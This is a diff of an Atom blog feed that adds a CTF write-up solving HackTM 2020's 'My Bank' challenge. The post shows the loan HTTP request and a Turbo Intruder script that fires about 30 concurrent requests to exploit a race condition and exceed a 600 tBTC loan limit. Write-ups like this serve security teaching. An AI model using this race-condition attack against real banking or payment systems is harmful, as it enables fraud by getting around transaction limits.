@@ -1,5 +1,121 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>securitytaters - 0xm4v3rick</title><link href="/" rel="alternate"></link><link href="/feeds/0xm4v3rick.atom.xml" rel="self"></link><id>/</id><updated>2019-12-21T17:01:00+05:30</updated><entry><title>Solving Execute No Evil from X-MAS CTF 2019</title><link href="/solving-execute-no-evil-from-x-mas-ctf-2019.html" rel="alternate"></link><published>2019-12-21T17:01:00+05:30</published><updated>2019-12-21T17:01:00+05:30</updated><author><name>0xm4v3rick</name></author><id>tag:None,2019-12-21:/solving-execute-no-evil-from-x-mas-ctf-2019.html</id><summary type="html">&lt;p&gt;Execute No Evil was another challenge, simple yet pain. Read about it here.&lt;/p&gt;</summary><content type="html">&lt;p&gt;The author note for this CTF challenge.&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>securitytaters - 0xm4v3rick</title><link href="/" rel="alternate"></link><link href="/feeds/0xm4v3rick.atom.xml" rel="self"></link><id>/</id><updated>2020-02-03T14:00:00+05:30</updated><entry><title>Solving My Bank from HackTM CTF Quals 2020</title><link href="/solving-my-bank-from-hacktm-ctf-quals-2020.html" rel="alternate"></link><published>2020-02-03T14:00:00+05:30</published><updated>2020-02-03T14:00:00+05:30</updated><author><name>0xm4v3rick</name></author><id>tag:None,2020-02-03:/solving-my-bank-from-hacktm-ctf-quals-2020.html</id><summary type="html">&lt;p&gt;This was the fastest challenge I have solved till now. Simple race condition leading to extra money and the flag.&lt;/p&gt;</summary><content type="html">&lt;p&gt;The note for this CTF challenge was as follows.&lt;/p&gt;
+&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
+2
+3
+4
+5
+6
+7&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;Who&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="n"&gt;got&lt;/span&gt; &lt;span class="n"&gt;my&lt;/span&gt; &lt;span class="n"&gt;money&lt;/span&gt;&lt;span class="o"&gt;?&lt;/span&gt;
+
+&lt;span class="n"&gt;Please&lt;/span&gt; &lt;span class="n"&gt;abstain&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="n"&gt;brute&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;forcing&lt;/span&gt; &lt;span class="n"&gt;files&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
+
+&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="mi"&gt;178&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;128&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;175&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;50090&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;
+
+&lt;span class="n"&gt;Author&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;nytr0gen&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+
+&lt;p&gt;Opening up the page asks you to register a user. So I registered with &lt;strong&gt;test1&lt;/strong&gt; username. After registering it redirects you to a page which allows you to borrow money from the bank with following restrictions.&lt;/p&gt;
+&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
+2
+3
+4&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;Username&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;test1&lt;/span&gt;
+&lt;span class="n"&gt;Maximum&lt;/span&gt; &lt;span class="n"&gt;Loan&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;600.00&lt;/span&gt; &lt;span class="n"&gt;tBTC&lt;/span&gt;
+&lt;span class="n"&gt;Money&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;0.00&lt;/span&gt; &lt;span class="n"&gt;tBTC&lt;/span&gt;
+&lt;span class="n"&gt;Account&lt;/span&gt; &lt;span class="n"&gt;TTL&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;600&lt;/span&gt; &lt;span class="n"&gt;seconds&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+
+&lt;p&gt;Another page allows you to buy some things with that loan as shown in below screenshot. &lt;/p&gt;
+&lt;p&gt;&lt;img alt="buymenu" src="img/3.1.jpg" /&gt;&lt;/p&gt;
+&lt;p&gt;So the flag costs 1337 tBTC. My initial thought was to try and somehow reduce the cost of the flag and see if we could buy it for lesser or 0 tBTC. When that didnt work I turned my attention to the request that allowed us to borrow money. We could only use amount between 1-100 at a time to request loan. So the request looked as follows.&lt;/p&gt;
+&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
+&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;178.128.175.6:50090&lt;/span&gt;
+&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0&lt;/span&gt;
+&lt;span class="na"&gt;Accept&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&lt;/span&gt;
+&lt;span class="na"&gt;Accept-Language&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;en-US,en;q=0.5&lt;/span&gt;
+&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip, deflate&lt;/span&gt;
+&lt;span class="na"&gt;Referer&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;http://178.128.175.6:50090/&lt;/span&gt;
+&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/x-www-form-urlencoded&lt;/span&gt;
+&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;111&lt;/span&gt;
+&lt;span class="na"&gt;Origin&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;http://178.128.175.6:50090&lt;/span&gt;
+&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
+&lt;span class="na"&gt;Cookie&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;session=.eJwNy0sKwlAMBdC9ZOyDvF-TuBmJ6Q2UgoLakbj3eubnS_F-5e3z3PGgK2XUO_dqE96tw9bsQyBIToYKkL5MZ6ULHce2_ke1piI6SoiPMlJn8R61aCjYbGlok34nOaYc6w.XjasFg.PWnojQn-C6SpmQjDY7mcqEUjpJQ&lt;/span&gt;
+&lt;span class="na"&gt;Upgrade-Insecure-Requests&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;1&lt;/span&gt;
+
+csrf_token=ImZjMWIwMzE5NWVhMzkzZTlkZjM0N2U3ZWYwZjBlODdlZWZhNjVhMDgi.XjasFg._FcPxt2e1-gKxNulB_K50yGj9yk&amp;amp;loan=100
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+
+&lt;p&gt;Response was &lt;strong&gt;302 FOUND&lt;/strong&gt; and we have 100 tBTC in our account. I tried to simply increase the loan amount in the next request but that didnt work. Also requesting loan after exhausting 600 limit didnt work. So the next thing that came to mind was to try race condition on this functionality.I had a feeling that it would work out. Such functionalities are frequently susceptible to race conditions.  &lt;/p&gt;
+&lt;p&gt;Turbo intruder is an awesome tool with which we can test for it. So I sent the above request to the turbo intruder with marker set at &lt;strong&gt;loan=100%s&lt;/strong&gt; and used below python code to test for it. It was picked up from the turbo turbo intruder repo &lt;a href="https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/race.py"&gt;here&lt;/a&gt;  &lt;/p&gt;
+&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;def&lt;/span&gt; &lt;span class="n"&gt;queueRequests&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;wordlists&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="n"&gt;engine&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;RequestEngine&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;endpoint&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;endpoint&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+                       &lt;span class="n"&gt;concurrentConnections&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;30&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+                       &lt;span class="n"&gt;requestsPerConnection&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+                       &lt;span class="n"&gt;pipeline&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;False&lt;/span&gt;
+                       &lt;span class="p"&gt;)&lt;/span&gt;
+
+    &lt;span class="o"&gt;#&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;gate&amp;#39;&lt;/span&gt; &lt;span class="n"&gt;argument&lt;/span&gt; &lt;span class="n"&gt;blocks&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="k"&gt;final&lt;/span&gt; &lt;span class="n"&gt;byte&lt;/span&gt; &lt;span class="k"&gt;of&lt;/span&gt; &lt;span class="k"&gt;each&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt; &lt;span class="k"&gt;until&lt;/span&gt; &lt;span class="n"&gt;openGate&lt;/span&gt; &lt;span class="k"&gt;is&lt;/span&gt; &lt;span class="n"&gt;invoked&lt;/span&gt;
+    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="n"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;30&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="n"&gt;engine&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;queue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;baseInput&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;gate&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;race1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+    &lt;span class="o"&gt;#&lt;/span&gt; &lt;span class="n"&gt;wait&lt;/span&gt; &lt;span class="k"&gt;until&lt;/span&gt; &lt;span class="k"&gt;every&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;race1&amp;#39;&lt;/span&gt; &lt;span class="n"&gt;tagged&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt; &lt;span class="k"&gt;is&lt;/span&gt; &lt;span class="n"&gt;ready&lt;/span&gt;
+    &lt;span class="o"&gt;#&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt; &lt;span class="n"&gt;send&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="k"&gt;final&lt;/span&gt; &lt;span class="n"&gt;byte&lt;/span&gt; &lt;span class="k"&gt;of&lt;/span&gt; &lt;span class="k"&gt;each&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;
+    &lt;span class="o"&gt;#&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;this&lt;/span&gt; &lt;span class="k"&gt;method&lt;/span&gt; &lt;span class="k"&gt;is&lt;/span&gt; &lt;span class="n"&gt;non&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;blocking&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;just&lt;/span&gt; &lt;span class="k"&gt;like&lt;/span&gt; &lt;span class="n"&gt;queue&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;engine&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;openGate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;race1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+    &lt;span class="n"&gt;engine&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;complete&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;timeout&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;60&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+
+&lt;span class="n"&gt;def&lt;/span&gt; &lt;span class="n"&gt;handleResponse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;interesting&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="k"&gt;table&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="k"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+
+&lt;p&gt;After launching the attack with the above configuration it gave me a bunch of 302 as shown below.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="turbo" src="img/3.2.jpg" /&gt;&lt;/p&gt;
+&lt;p&gt;I went back and checked the page to see if that worked and I was shown 1400 tBTC in the account which meant the attacked worked quite well.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="account" src="img/3.3.jpg" /&gt;&lt;/p&gt;
+&lt;p&gt;Only thing now that was left to do was buy the flag with with 1337 tBTC and retrieve the flag.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="flag" src="img/3.4.jpg" /&gt;&lt;/p&gt;
+&lt;p&gt;That was the fasted challenge I have ever completed and the first race condition I exploited. Round about an hour including the research required to exploit which wasn't much as it was quite straight forward. The main point here was to figure out that the vulnerability was the race condition. Having read on race conditions before I could deduce it was a possibility.&lt;br /&gt;
+Finally, thanks to HackTM for a nice challenge.&lt;/p&gt;</content><category term="CTF"></category><category term="webappsec"></category><category term="race condition"></category><category term="turbo intruder"></category></entry><entry><title>Solving Execute No Evil from X-MAS CTF 2019</title><link href="/solving-execute-no-evil-from-x-mas-ctf-2019.html" rel="alternate"></link><published>2019-12-21T17:01:00+05:30</published><updated>2019-12-21T17:01:00+05:30</updated><author><name>0xm4v3rick</name></author><id>tag:None,2019-12-21:/solving-execute-no-evil-from-x-mas-ctf-2019.html</id><summary type="html">&lt;p&gt;Execute No Evil was another challenge, simple yet pain. Read about it here.&lt;/p&gt;</summary><content type="html">&lt;p&gt;The author note for this CTF challenge.&lt;/p&gt;
 &lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
 2
 3
